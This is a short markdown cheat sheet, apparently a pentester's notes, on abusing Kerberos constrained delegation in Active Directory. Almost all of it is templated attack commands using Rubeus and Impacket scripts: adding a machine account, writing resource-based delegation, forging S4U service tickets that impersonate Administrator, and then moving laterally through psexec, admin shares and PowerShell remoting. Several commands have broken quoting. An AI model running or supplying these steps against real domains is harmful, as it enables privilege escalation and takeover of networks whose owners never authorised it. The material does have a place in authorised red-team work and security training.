# Constrained Delegation

## Tools: Rubeus , rbcd.py , addcomputer.py , getST.py

### Object: msDS-AllowedToDelegateTo

### UACs TRUST_TO_AUTH_FOR_DELEGATION (With protocol transition (any)) / TRUSTED_FOR_DELEGATION (Without protocol transition (kerberos only))

# 1) Without protocol transition (kerberos only)  msDS-AllowedToDelegateTo TRUSTED_FOR_DELEGATION

 - addcomputer.py -computer-name 'RBCD_COM$' -computer-pass 'RBCD_COM_PASSWORD' -dc-ip DC -DOMAIN/USER:PASSWORD' (RBCD)

 - rbcd.py -delegate-from 'RBCD_COM$' -delegate-to 'CONSTRAINED$' -dc-ip -'DC' -action 'write' -hashes 'HASH DOMAIN/CONSTRAINED$ (For Self RBCD, Skip the 1st step entirely)

 - getST.py -self -impersonate "administrator" -dc-ip IP DOMAIN/RBCD_COM$':'RBCD_COM_PASSWORD'

 - getST.py -spn host/CONSTRAINED -hashes 'HASH' 'DOMAIN/COMPUTER_ACCOUNT' -impersonate Administrator --dc-ip DC_IP -additional-ticket PREVIOUS_TICKET

 - getST.py -spn CONSTRAINED_SPN/TARGET -hashes 'HASH' 'DOMAIN/CONSTRAINED$' -impersonate Administrator --dc-ip DC_IP -additional-ticket PREVIOUS_TICKET

#### This technique gives a Kerberos TGS (Service ticket)

# 2) (With protocol transition (any)) msDS-AllowedToDelegateTo TRUST_TO_AUTH_FOR_DELEGATION

 - Rubeus hash /password:PASSWORD

## OR 

 - Rubeus asktgt /user:USER /domain:DOMAIN /aes256:AES_256_HASH

 - Rubeus s4u /ticket:TICKET /impersonateuser:ADMIN_USER /msdsspn:SPN_CONTRAINED /altservice:CIFS /ptt (Choose the altservice below to use with rubeus)

### Altservice:

#### 1) HOST

 - psexec \\\TARGET CMD

#### 2) CIFS

 - dir \\TARGET\c$

#### 3) HTTP

 - Enter-Pssession -computername TARGET

## OR 

 - Invoke-Command TARGET -Scriptblock {COMMAND}

#### 4) LDAP (No interactions)

### This attack gives a Kerberos TGS (Service Ticket)
